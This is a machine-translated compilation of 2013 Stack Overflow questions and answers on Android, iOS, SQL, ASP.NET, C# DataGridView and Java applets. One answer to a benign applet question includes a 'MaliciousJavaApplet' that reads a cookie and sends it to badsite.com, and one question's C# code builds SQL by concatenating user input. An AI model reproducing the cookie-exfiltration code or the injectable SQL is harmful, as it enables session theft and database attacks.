> 时间：2013-03-20T14:15:32.563
> 
> 标签：android, httprequest

我尝试使用以下代码向服务器发出请求：

```
 HttpClient client = new DefaultHttpClient();
    HttpPut put= new HttpPut(SERVER_URL + "/subscribe");

    List<NameValuePair> pairs = new ArrayList<NameValuePair>();
    pairs.add(new BasicNameValuePair("UserId", params.get("UserId")));
    pairs.add(new BasicNameValuePair("Endpoint", params.get("Endpoint")));
    pairs.add(new BasicNameValuePair("SessionKey", params.get("SessionKey")));
    pairs.add(new BasicNameValuePair("SessionSecret", params.get("SessionSecret")));
    pairs.add(new BasicNameValuePair("Token", params.get("Token")));
    pairs.add(new BasicNameValuePair("CultureInfo", params.get("CultureInfo")));
    put.setEntity(new UrlEncodedFormEntity(pairs));
    put.setHeader("Content-Type", "application/json");
    HttpResponse response = client.execute(put);
    response.getStatusLine(); 
```

服务器在 getStatusLine 方法中返回 500 代码响应，所以我想知道完整的请求文本以查看创建了什么请求。有什么建议可以做到吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:25:59.060

打开 WIRE 的[日志](https://stackoverflow.com/questions/3246792/how-to-enable-logging-for-apache-commons-httpclient-on-android) 和 HEADERS 的日志

您需要阅读上述帖子，以了解如何为您尝试测试的连接切换完整的 http 日志。正如您在下面的示例中所看到的，一旦您获得日志，您就可以看到标题中的所有内容以及通过网络传输的所有内容（客户端到服务器和服务器到客户端）。

使用 CURL 的建议 - 如果您使用这些工具进行开发，您可以考虑使用 curl 客户端，以便在编写 Android 代码之前对客户端/服务器之间的对话进行建模。然后，借助 android 日志，您可以通过 android 发送，正是您从 CLI curl 客户端发送的内容，从而避免了 RC=500 的所有模糊问题。

打开日志记录的详细信息：

```
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "HTTP/1.1 200 OK[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Content-Type: application/json; charset=utf-8[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Content-Disposition: attachment[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Date: Fri, 16 Nov 2012 01:05:15 GMT[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Expires: Fri, 16 Nov 2012 01:05:15 GMT[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Cache-Control: private, max-age=0[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "X-Content-Type-Options: nosniff[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "X-Frame-Options: SAMEORIGIN[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "X-XSS-Protection: 1; mode=block[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Server: GSE[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "Transfer-Encoding: chunked[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "71[\r][\n]"
./speechapi_1:D/ch.boye.httpclientandroidlib.wire( 6461): << "{"status":0,"id":"d70bb25a44fe84fb8bf7acf10c73b869-1","hypotheses":[{"
utterance":"hi","confidence":0.83725035}]}[\n]" 
```

# objective-c - 正确使用 Objective-C 协议

> ID：15526049
> 
> 赞同：0
> 
> 时间：2013-03-20T14:15:41.653
> 
> 标签：objective-c, interface, protocols

我正在利用空闲时间玩Objective C。我正在阅读有关Protocols的内容，但我担心我可能用错了，考虑到我使用它的方式与我使用的方式相同（至少几乎相同，呵呵） C# 代码。

所以，这就是我得到的。我有一个协议，一个类管理器来弱耦合我的视图和两个实现该协议的视图。

```
@protocol IView <NSObject>
- (void) loadViewToScreen;
@end 
```

* * *

```
@interface ViewManager : NSObject

@property (atomic, weak) id<IView> document;
@property (atomic, weak) id<IView> browser;

//Singleton
+ (id) getInstance;
@end 
```

* * *

然后我将一种观点称为彼此的观点。

```
ViewManager *vm = [ViewManager getInstance];
[vm.browser loadViewToScreen]; 
```

我对将视图加载到屏幕的最佳方式不感兴趣。它只是一个测试协议的模拟代码。

我无法让经理使用指向协议的指针。所以我担心我会得到视图副本。我做对了吗？

谢谢，卢卡斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:32:20.863

协议，concpetually，只是对象或类的类型的一部分。您无法获得指向协议的指针。（嗯，实际上你可以获得一个协议对象，但那是运行时模拟，这似乎不是你想要的）。

不过，不要害怕获得副本。除非您复制对象或将其分配给复制属性，否则您将获得指向同一实例的指针。

# mysql - SQL 中的互斥值

> ID：15526050
> 
> 赞同：2
> 
> 时间：2013-03-20T14:15:43.180
> 
> 标签：mysql, sql

我有一个从表中选择产品的查询。一个产品可以有多个价格（考虑各种价格）和一个默认价格。

当然，这是一对多的关系。我需要选择具有给定价格或默认价格的产品 - 这意味着互斥。我知道这可以通过单独的查询和 WHERE (not) IN 子句或联合语句来完成，但我相信必须有更优化的方法。我的查询目前如下所示：

```
SELECT products.*, products_prices.price 
FROM products RIGHT JOIN 
     products_prices ON (products.id = products_prices.productId) 
WHERE products_prices.businessId = ? 
OR    products_prices.businessId IS NULL // this needs to become mutual. 
```

编辑：我最终使用了这个查询，它是 Gordon Linoff 的稍微修改过的版本：

```
 SELECT distinct p.*, coalesce(pp.price, defpp.price)
 FROM products p LEFT JOIN 
      products_prices pp
      ON p.id = pp.productId and pp.businessId = ? left join
      products_prices defpp
      on p.id = defpp.productId and defpp.businessId is NULL 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T14:21:38.367

如果我正确理解了您的问题，则该`products`表将具有默认价格，而该`product_prices`表将具有任何其他价格。

您想知道在哪里使用了默认价格，这意味着没有其他价格。为此，请使用`left outer join`：

```
SELECT p.*, coalesce(pp.price, p.default_price)
FROM products p LEFT OUTER JOIN 
     products_prices pp
     ON p.id = pp.productId
WHERE pp.price = GIVENPRICE or pp.price is null 
```

根据您的评论，您将默认价格存储在业务 ID 为 NULL 的记录中。在这种情况下，我将对价格表进行两次连接：

```
SELECT p.*, coalesce(pp.price, defpp.price)
FROM products p LEFT OUTER JOIN 
     products_prices pp
     ON p.id = pp.productId and pp.price = GIVENPRICE left outer join
     products_prices defpp
     on p.id = defpp.productId and defpp.businessId is NULL 
```

第一个连接获得与给定价格匹配的价格。第二个获得默认价格。如果存在，则使用第一个结果，否则使用第二个结果。

# c# - How should I load a CSS style based on user setting?

> ID：15526059
> 
> 赞同：5
> 
> 时间：2013-03-20T14:16:07.920
> 
> 标签：c#, asp.net-mvc

In my ASP.NET MVC website people can choose between different css styles. In the future the name of these css styles will be stored in a database.

I have the following method *(does not yet communicate with a database)*:

```
public FileResult CssStyle()
{
    string style = "/Content/wide-site.css";

    if (!String.IsNullOrWhiteSpace(style))
    {
        return File(style, "text/css");
    }

    return File("/Content/site.css", "text/css");
} 
```

And in my _Layout.cshtml I use this line to load the stylesheet:

```
<link href="@Url.Action("CssStyle", "Home")" rel="stylesheet" type="text/css" /> 
```

Suppose that this CssStyle() method does a request to the database and for every page load it executes a query. What's the best way to prevent these unnecessary requests? A session perhaps?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:19:33.353

Run the query when it matters, so for example on login, and then store the CSS file name in `Session`. You would also need to refresh the `Session` variable if you have a profile page where the users can change their style - that way when they change it they would see the new style immediately.

Then in your method, pull that value out of `Session`:

```
var cssFile = Session["UserStyle"]; 
```

for example.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:19:06.787

I would suggest that you either cache it or store it in a session variable.

That way you are not needlessly going off to the database everytime.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-20T14:39:49.713

First, have you confirmed that this operation needs to be optimized? If you're using sessions then you're usually accessing the file system, which is the same order of magnitude, at least on local installations, as DB accesses.

Will assume the DB is remote and over a very slow connection such that it is worth the effort to reduce DB accesses.

Also, it isn't clear how the user selects the stylesheet so assuming there will be a parameter of some sort.

If you want a solution not using sessions, say at most one DB access per CSS file per day, you could do something like this:

```
public FileResult CssStyle(variant which)
{
    // Hash the function, date and which stylesheet to ensure global,
    // valid, unique, and easily replicated filename
    filename = md5("get_css_style" + today() + which) + ".css"
    if (!file_exists(filename))
    {
        // DB operation here
        // create file here using filename
    }
    return File(filename, "text/css");
} 
```

# c# - C# 在更新或插入另一个表单时刷新 DataGridView

> ID：15526067
> 
> 赞同：16
> 
> 时间：2013-03-20T14:16:28.007
> 
> 标签：c#, datagridview

我有 2 种形式，它们是`form A`和`form B`，

`form A`允许用户插入和更新学生信息。

`form b`那里只有一个 DataGridView 和按钮。

当我在 上插入学生时`form A`，然后转到`form B`，新学生没有显示在 DataGridView 上，如果我重新运行程序，新学生将出现在`form B`.

我尝试在表单 b 上的按钮上使用它

```
datagridview1.refresh();
datagridview1.update(); 
```

但它仍然无法正常工作。

* * *

编辑：

我插入工人的代码

```
cmd = new OleDbCommand("insert into FWINFOS (ID,Name,Gender,DateOfBirth,Race,WorkingPlace,PassportNO,DateOfExpire,[Position],Photo) values('" + textBox5.Text + "','" + textBox1.Text + "','" + textBox2.Text + "','" + dateTimePicker1.Value + "','" + textBox3.Text + "','" + textBox4.Text + "','" + textBox6.Text + "','" + dateTimePicker2.Value + "',@Position,@Photo)", con);

        cmd.Parameters.AddWithValue("@Position", comboBox1.SelectedText.ToString());
        conv_photo();

        con.Open();
        int n = cmd.ExecuteNonQuery();
        //cmd.ExecuteNonQuery();
        con.Close();
        if (n > 0)
        {
            MessageBox.Show("Inserted");
            loaddata();

            rno++;
        }
        else
            MessageBox.Show("No Insert");

    } 
```

当我插入一个新的工人时，我`Datagridview1(Form2)`的不会自动更新。但是如果我重新运行应用程序，新的工作人员就会出现。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-20T14:22:03.737

```
// Form A
public void loaddata()
{
    //do what you do in load data in order to update data in datagrid
} 
```

然后在表格 B 上定义：

```
// Form B
FormA obj = (FormA)Application.OpenForms["FormA"];

private void button1_Click(object sender, EventArgs e)
{
    obj.loaddata();
    datagridview1.Update();
    datagridview1.Refresh();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-20T14:38:18.183

[`DataGridView.Refresh`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.refresh.aspx)和 And[`DataGridView.Update`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.update.aspx)是从 Control 继承的方法。它们与重绘控件有关，这就是新行不出现的原因。

我的猜测是数据检索在 Form_Load 上。如果您希望 Form B 上的 Button 从数据库中检索最新数据，那么无论 Form_Load 正在做什么，您都必须这样做。

一个很好的方法是将数据检索调用分离到一个单独的函数中，并从 From Load 和 Button Click 事件中调用它。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-11-10T18:55:17.620

对于 C# 中的 datagridview，请使用此代码

```
con.Open();
MySqlDataAdapter MyDA = new MySqlDataAdapter();
string sqlSelectAll = "SELECT * from dailyprice";
MyDA.SelectCommand = new MySqlCommand(sqlSelectAll, con);

DataTable table = new DataTable();
MyDA.Fill(table);

BindingSource bSource = new BindingSource();
bSource.DataSource = table;

dataGridView1.DataSource = bSource;
con.Close(); 
```

它适用于在 datagridview 中显示新记录。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-11-26T14:24:35.210

**在您只需要此代码的任何地方刷新数据网格视图：**

```
datagridview1.DataSource = "your DataSource";
datagridview1.Refresh(); 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2017-08-23T13:00:31.807

我的 datagridview 是 editonEnter 模式。所以它只有在我离开单元格或我重新访问并退出单元格两次后才会刷新。

立即触发。我从 datagridview 中解脱出来。然后重新聚焦它。

```
 this.SelectNextControl(dgv1,true,true,false,true);    
 Application.DoEvents();    //this does magic
 dgv1.Focus(); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-20T15:33:07.043

举一个简单的例子，应该是一个足够的起点

表格 A 中的代码

```
public event EventHandler<EventArgs> RowAdded;

private void btnRowAdded_Click(object sender, EventArgs e)
{
     // insert data
     // if successful raise event
     OnRowAddedEvent();
}

private void OnRowAddedEvent()
{
     var listener = RowAdded;
     if (listener != null)
         listener(this, EventArgs.Empty);
} 
```

表格 B 中的代码

```
private void button1_Click(object sender, EventArgs e)
{
     var frm = new Form2();
     frm.RowAdded += new EventHandler<EventArgs>(frm_RowAdded);
     frm.Show();
}

void frm_RowAdded(object sender, EventArgs e)
{
     // retrieve data again
} 
```

您甚至可以考虑创建自己的`EventArgs`类来包含新添加的数据。然后，您可以使用它直接将数据添加到 DatagridView 中的新行

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-12-07T18:33:19.077

我想做同样的事情。

```
 public static bool update = false;
  Timer t = null;
  private void RefreshTable()
  {
     t = new Timer();
     t.Interval = 1000;
     t.Tick += new EventHandler(t_Tick);
     t.Enabled = true;
  }

  void t_Tick(object sender, EventArgs e)
  {
     if (update)
        {
           dataGridView.Rows.Clear();
           dataGridView.Refresh();
           setCustomerDetailsTable();
           update = false;
        }
   } 
```

我在包含 dataGridView 的表单中使用一个静态变量，并从表单 A 访问它。当用户插入或更新详细信息时，我设置了`update`变量`true`，以便在下次计时器计时表更新并将其设置 `update`为 false 时。这可以防止它每次更新计时器滴答声。在我的例子中，这`setCustomerDetailsTable()`是最初在 Form_Load 上加载数据的函数。我确信这不是最好的方法。但是，我也使用此计时器在 UI 上显示时钟。所以我也给它分配了这个任务。当我调用`RefreshTable()`Form_Load 时，它会执行我想要的操作。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2020-08-20T15:37:33.797

创建一个小函数并在任何地方使用它

```
public SqlConnection con = "Your connection string"; 
public void gridviewUpdate()
{
    con.Open();
    string select = "SELECT * from table_name";
    SqlDataAdapter da = new SqlDataAdapter(select, con);
    DataSet ds = new DataSet();
    da.Fill(ds, "table_name");
    datagridview.DataSource = ds;
    datagridview.DataMember = "table_name";
    con.Close();
} 
```

# android - SurfaceView 覆盖

> ID：15526084
> 
> 赞同：0
> 
> 时间：2013-03-20T14:17:19.520
> 
> 标签：android, view, overlay, surfaceview

我有一个运行几个线程的表面视图。其中一个线程是在surfaceview 画布上绘图——一种动画。现在我想“覆盖”一个图像（透明） - 出现在表面视图上方。这看起来类似于 HTC 帮助 - 覆盖帮助文本。其中一个线程将在请求时设置此覆盖（并在请求时清除它）。最简单的方法是什么？我应该将surfaceview与另一个ImageView放在一个框架布局中吗？我必须以编程方式执行此操作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T13:03:14.363

我添加了一个 ImageView 组件并根据需要从表面线程中设置/删除“覆盖”图像。它可以工作，但我不喜欢“定时”解决方案——这个叠加层应该会延迟弹出并在一段时间后自动将其删除。

我所做的是：

表面螺纹中的某处：

```
if (condition) {
    postDelayed(new Runnable() {

        // set overlay image

        postDelayed(new Runnable(){

            // remove overlay image

        }, hideDelay);

    }, showDelay);
} 
```

我不喜欢这个嵌套的 postDelayed。我尝试使用睡眠，但它不起作用，因为我会预期 => 覆盖图像视图在睡眠用完之前不会失效（也尝试手动调用无效）。

对这个有什么想法吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T16:00:52.310

检查这个[链接](https://stackoverflow.com/questions/3956300/overlay-an-android-layout-on-a-surfaceview?rq=1)上的答案..我希望这会有所帮助。另一种方法是创建自己的组件，可以基于 View 或基于 SurfaceView 但它更高级。

# iphone - 将 JSON 响应写入 .plist 文件

> ID：15526086
> 
> 赞同：10
> 
> 时间：2013-03-20T14:17:24.777
> 
> 标签：iphone, ios, objective-c, json, plist

**楼上的无奈！！！**

我从服务中获得了一些**JSON 响应**，我想将其存储在**.plist 文件**中以供将来参考。我无法将我的**JSON 响应保存到 .plist File**。我认为这是由于`null`响应中的一些值。

**注意：我** *使用*[jsonparser](http://jsonparser.com/)*确认响应是**JSON 格式*** 。

* * *

**我的代码：**

```
NSError *error;
NSDictionary* json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
NSDictionary *dictResult = [(NSDictionary*)json objectForKey:@"myKey"];
NSLog(@"Result Dictionary :: %@",dictResult);

NSURL *cacheDir = [[[NSFileManager defaultManager] URLsForDirectory:NSCachesDirectory inDomains:NSUserDomainMask] lastObject];
NSURL *path = [cacheDir URLByAppendingPathComponent:@"FinalResult.plist"];
NSLog(@"Path :: %@",path);

BOOL success = [dictResult writeToURL:path atomically:YES];
NSLog(@"success? %d", success); 
```

**注意：** *我得到了所有的**NSLog 值**（表示**响应字典**和**文件路径**，但**0 表示成功**）*。

* * *

**问题：**响应中几乎有**70-80 个键值对**，我不想**删除/替换**所有`null`值。因为我想要的是...

> 1.  从服务器获取响应。
> 2.  用响应填充所有**UITextField 。**
> 3.  **使用UITextFields中的一些****编辑值**向服务器发布相同的响应。

 **所以，我只想更改`UITextField`对象中的编辑值并让它 POST 到服务器。

**解决此问题的最佳方法是什么？**

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-20T19:57:40.657

我敢打赌，您的 JSON 至少包含一个`null`值。

当您拥有包含的 JSON`null`并使用 对其进行转换时`NSJSONSerialization`，将`null`替换为`NSNull`. 如果您的字典包含`NSNull`，`writeToURL:atomically:`则将失败。

这是因为读取和写入字典（和数组）的便捷方法仅在集合中的数据仅限于**属性列表类型**时才有效。这些都是：

*   `NSString`
*   `NSNumber`
*   `NSData`
*   `NSDate`
*   `NSArray`
*   `NSDictionary`. 对于字典，键必须是`NSString`s。

您还可以`NSMutableString`在编写时使用可变子类（如 ）。

如果您有任何不在该列表中的内容，则不能使用`writeToURL:atomically`或任何类似的便捷方法。

问题是某些有效的 JSON 无法转换为属性列表。此外，一些有效的属性列表无法转换为 JSON（因为`NSDate`不会自动转换为有效的 JSON）。

如果是我，我只会将数据写入 JSON 文件。保留其原始格式。您可以轻松地与 JSON 进行转换，因此请保持这种状态。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-01T10:00:38.140

如果您的字典包含`NSNull`，则`writeToURL:atomically`: 将失败。

对于字典，**键必须是 NSStrings**。

问题是某些有效的**JSON**无法转换为属性列表。此外，一些有效的属性列表无法转换为**JSON**。

**不要忘记，如果必须使用属性列表，则需要扫描整个字典并将空值转换为可以保存在属性列表文件中的内容。**

唯一的解决方案是您必须检查所有**NULL 值**并将其替换为**@" "**。

快乐的编码...

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-24T07:15:23.263

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
NSString *libraryPath = [paths objectAtIndex:0];
NSString *filename = @"FinalResult.plist";
NSString *pathFilename = [libraryPath stringByAppendingPathComponent:filename];

NSDictionary *dictResult = [json objectForKey:@"myKey"];
[dictResult writeToFile:pathFilename atomically:YES]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T15:05:18.437

我以这种方式构建我的文件网址：

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
NSString *path = [paths objectAtIndex:0];
NSString *filename = @"FinalResult.plist";
NSString *pathFilename = [path stringByAppendingPathComponent:filename]; 
```

然后看看是否这样写：

```
BOOL success = [dictResult writeToFile:pathFilename atomically:YES];
NSLog(@"success? %d", success); 
```

**编辑**- 有趣，我最近才遇到这个问题，然后就忘记了。一些 JSON 解析器将使用 [NSNull null] 作为 nil 值的占位符。我写了这个（说真的，大约两周前，然后在上面隔开）来清理解析结果......

```
- (NSDictionary *)compact:(NSDictionary *)aDictionary {

    NSDictionary *answer = [NSMutableDictionary dictionary];

    for (NSString *key in [aDictionary allKeys]) {
        id value = [self.dictionary valueForKey:key];
        if (value && value != [NSNull null]) {
            [answer setValue:value forKey:key];
        }
    }
    return [NSDictionary dictionaryWithDictionary:answer];
} 
```

如果您愿意，可以将其添加到 NSDictionary 类别中。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-20T14:30:30.823

*   检查`writeToURL:atomically:`方法的返回值是否返回YES。
*   如果没有，请检查您是否对该 URL 具有写入权限。
*   尝试使用另一个 URL 来确定是它的路径还是导致此错误的字典的内容。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-03-20T15:29:19.280

试试这个，它会工作：

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *path = [documentsDirectory stringByAppendingPathComponent:@"country.plist"];
[jsonData writeToFile:path atomically:YES]; 
```**

# java - 使用 URL 类使用 java 小程序创建到 Internet 的简单连接

> ID：15526088
> 
> 赞同：0
> 
> 时间：2013-03-20T14:17:28.930
> 
> 标签：java, url, applet

我想创建一个简单的 URL 连接，例如，从我的预定义主机读取内容，在我的例子中 - localhost/applet，你能告诉我怎么做吗？我一直在谷歌搜索，但到目前为止没有任何明显的成功。

该文件的内容是`some text SOME TEXT`，然后应该在小程序中打印。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:25:45.080

您可以使用 URL 类执行此操作：

```
URL url;
InputStream is = null;
DataInputStream dis;
String line;
url = new URL([put a string with the local host address here. Usual is something like 127.0.0.1]); // can also just put a website to test it.
is = url.openStream();  // throws an IOException
dis = new DataInputStream(new BufferedInputStream(is));

while ((line = dis.readLine()) != null) {
    System.out.println(line); //will get each line from the text file and print it. could also put it in a variable.
} 
```

你的问题有点混乱，如果我没有回答，请告诉我。你是什​​么意思`localhost/applet`它是一个java小程序？还是只是一个文本文件名小程序？文本文件到底在哪里？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:27:23.663

未签名的小程序

未签名的小程序可以执行以下操作：

他们可以与他们来自的主机建立网络连接。他们可以使用 java.applet.AppletContext 类的 showDocument 方法轻松地显示 HTML 文档。他们可以在同一页面上调用其他小程序的公共方法。从本地文件系统（从用户的 CLASSPATH 中的目录）加载的小程序没有通过网络加载的小程序所具有的限制。他们可以读取安全系统属性。有关安全系统属性的列表，请参阅系统属性。使用 JNLP 启动时，未签名的小程序还可以执行以下操作： 它们可以在客户端打开、读取和保存文件。他们可以访问共享的系统范围的剪贴板。他们可以访问打印功能。他们可以在客户端上存储数据，决定应如何下载和缓存小程序，等等。有关使用 JNLP API 开发小程序的更多信息，请参阅 JNLP API。未签名的小程序不能执行以下操作：

他们无法访问客户端资源，例如本地文件系统、可执行文件、系统剪贴板和打印机。他们无法连接到任何第三方服务器（除了它源自的服务器之外的任何服务器）或从任何第三方服务器检索资源。他们无法加载本机库。他们无法更改 SecurityManager。他们无法创建 ClassLoader。他们无法读取某些系统属性。有关禁止的系统属性列表，请参阅系统属性。签名小程序

已签名的小程序没有对未签名的小程序施加的安全限制，并且可以在安全沙箱之外运行。

```
import java.awt.*;
import java.io.*;
import java.net.*;
public class MaliciousJavaApplet extends java.applet.Applet {
    TextArea messageLog = new TextArea(4, 40);
    public void init() {
      setLayout(new BorderLayout());
      add("Center", messageLog);
    }
    public void start() {
      try {
                             URL url = new URL("http://www.targetsite.net/default.html");
                             URLConnection connection;
                             String inputLine;
                             BufferedReader inReader;
          connection = url.openConnection();
                             connection.setAllowUserInteraction(false);
                             connection.setDoOutput(true);
                             messageLog.append("Request Property
"+connection.getRequestProperty("cookie")+"\n");
                             messageLog.append("File read from URL " + url + ":\n");
          inReader = new BufferedReader(
                   new InputStreamReader(connection.getInputStream()));
          while (null != (inputLine = inReader.readLine())) {
             messageLog.append(inputLine + "\n");
          }
          inReader.close();
                             messageLog.append("Request Property
"+connection.getRequestProperty("cookie")+"\n");
                             String cookie;
                             cookie = connection.getRequestProperty("cookie");
                             URL url2 = new
URL("http://www.badsite.com/default.html?cookie="+cookie);
                             URLConnection connection2;
                             String inputLine2;
                             BufferedReader inReader2;
          connection2 = url2.openConnection();
                             connection2.setAllowUserInteraction(false);
                             connection2.setDoOutput(true);
                             inReader2 = new BufferedReader(
                   new InputStreamReader(connection2.getInputStream()));
          while (null != (inputLine2 = inReader2.readLine())) {
             messageLog.append(inputLine2 + "\n");
          }
          inReader2.close();
      }
      catch (IOException e) {
          System.err.println("Exception: " + e);
  }
}
} 
```

# iphone - 每次打开我的应用程序时打开视图，仅当使用选择

> ID：15526090
> 
> 赞同：0
> 
> 时间：2013-03-20T14:17:31.940
> 
> 标签：iphone, ios, objective-c

我正在为 iOS 编写游戏，我想知道如何在每次打开应用程序时打开指令视图控制器。我想要一个开关，上面写着“每次都给我看”。如果他们将其切换为 no，则在打开应用程序时将不再显示说明。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:21:21.607

您可以使用[NSUserDefaults](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/Reference/Reference.html)存储开关值，然后在每次应用程序启动时在您的应用程序委托 applicationDidBecomeActive 方法中检查它。

```
- (void)applicationDidBecomeActive:(UIApplication *)application
{
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
   BOOL switchState = [[NSUserDefaults standardUserDefaults] boolForKey:@"switchKey"];
   if(switchState) {
       //If switch is on create the instance of InstructionViewController
       //you can call any of InstructionViewController methods on it.
       InstructionViewController* intructionsViewController = [[InstructionViewController alloc] init];
       //Present the instance of instruction view on top of your current view
       [self.window.rootViewController presentViewController:controller animated:YES completion:nil];
   }
} 
```

# android - 用mac删除avd模拟器

> ID：15526093
> 
> 赞同：16
> 
> 时间：2013-03-20T14:17:36.533
> 
> 标签：android, emulation, avd

我正在尝试手动删除多个模拟器。原因是当我从 avd 管理器中删除它们时，总是表明模拟器正在运行.. 不正确。我使用的是 Mac，使用终端和查找器，但找不到模拟器所在的文件夹

任何人都可以帮忙吗？

非常感谢你。

最好的祝福

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2013-03-20T14:46:08.737

OSX 上的模拟器实例 (AVD) 可以在以下位置找到：

```
~/.android/avd 
```

因此，从终端：

```
cd ~/.android/avd
ls 
```

将向您展示模拟器及其配置。请注意，每个存在的模拟器都有一个 .avd 目录和一个 .ini 文件。

跑步：

```
rm -rf emulatorNameIWantToDelete.* 
```

从 ~/.android/avd 目录将手动删除该模拟器。

请小心，因为 rm -rf 命令会永久删除某些内容。

# asp.net-mvc-3 - MVC 3\. 更新 jquery.validate。客户端验证不起作用

> ID：15526096
> 
> 赞同：1
> 
> 时间：2013-03-20T14:17:44.130
> 
> 标签：asp.net-mvc-3, validation, client-side

将 jquery.validate-1.8 更新为 jquery.validate-1.11 后，mvc 3 客户端验证不起作用。
采用：

*   jquery-1.9.1.min.js
*   jquery-ui-1.10.2.custom.js
*   jquery.validate.js (jquery.validate-1.11)
*   jquery.validate.unobtrusive.js（Microsoft jQuery Unobtrusive Validation 2.0.30116.0）
*   jquery.unobtrusive-ajax.min.js (Microsoft jQuery Unobtrusive Ajax 2.0.30116.0)

客户端验证适用于以下库：
使用：

*   jquery-1.9.1.min.js
*   jquery-ui-1.10.2.custom.js
*   jquery.validate.js (jquery.validate-1.8)
*   jquery.validate.unobtrusive.js（Microsoft jQuery Unobtrusive Validation 2.0.30116.0）
*   jquery.unobtrusive-ajax.min.js (Microsoft jQuery Unobtrusive Ajax 2.0.30116.0)

如何升级？
谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T05:25:15.260

我使用隐藏标签选择的 jquery ui 自动完成组合框。默认情况下 1.8 是不忽略隐藏字段的。旧版本被忽略。要解决此问题，请使用：

```
$.validator.setDefaults({
   ignore: []
}); 
```

# android - 自定义应用标题

> ID：15526104
> 
> 赞同：0
> 
> 时间：2013-03-20T14:17:56.477
> 
> 标签：android, android-layout, android-widget

我正在尝试实现自定义应用程序标题。我做了一个自定义布局，将标题文本颜色更改为白色。

```
<?xml version="1.0" encoding="utf-8"?>
<TextView
     xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/textView1"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:paddingLeft="0dp"
     android:text="@string/title_activity_main"
     android:textAppearance="?android:attr/textAppearanceMedium"
     android:textColor="@color/textColorWhite"/> 
```

在活动 onCreate()

```
requestWindowFeature(Window.FEATURE_LEFT_ICON);
setContentView(R.layout.activity_home);
setFeatureDrawableResource(Window.FEATURE_LEFT_ICON, R.drawable.my_icon);
getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE, R.layout.layout_custom_app_title); 
```

它无法在 Android 2.2 设备上运行。但是，我在 4.0 版本上测试成功

有没有人有任何解决方法？

**编辑：**

```
<style name="customWindowTitle">
    <item name="android:textColor">@color/textColorWhite</item>
</style>

<style name="LightThemeSelector" parent="android:Theme.Light">
    <item name="android:windowBackground">@drawable/app_background</item>
    <item name="android:textColor">@color/textColorBlack</item>
    <item name="android:windowTitleStyle">@style/customWindowTitle</item>
</style> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:27:08.487

您可以使用自定义主题轻松完成此操作。这样做是程序

在 style.xml 添加

```
<resources>
    <style name="CustomWindowTitleBackground">
        <item name="android:background">@color/textColorWhite</item>
        // here you can add other attributes
    </style>

    <style name="CustomTheme" parent="android:Theme">
        <item name="android:windowTitleSize">25dip</item>
        <item name="android:windowTitleBackgroundStyle">@style/CustomWindowTitleBackground</item>
    </style>
</resources> 
```

并在 AndroidManifest.xml 添加

```
<application android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@style/CustomTheme"> 
```

# jquery - jquery文件上传提交表单输入键按下

> ID：15526106
> 
> 赞同：1
> 
